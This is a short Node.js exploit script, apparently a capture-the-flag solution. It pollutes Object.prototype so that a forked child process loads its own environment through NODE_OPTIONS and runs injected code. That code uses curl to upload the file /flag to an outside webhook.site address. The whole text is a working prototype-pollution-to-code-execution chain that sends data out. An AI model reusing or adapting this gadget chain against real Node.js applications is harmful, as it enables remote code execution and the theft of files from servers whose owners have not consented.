const { execSync, fork } = require('child_process');

// Manual Pollutionb
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('curl -X POST -F upfile=@/flag https://webhook.site/f32b5cc9-656e-4cc5-a4e6-475cb256f19a').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"

// Trigger gadget
var child = fork('./kurenaif.js');
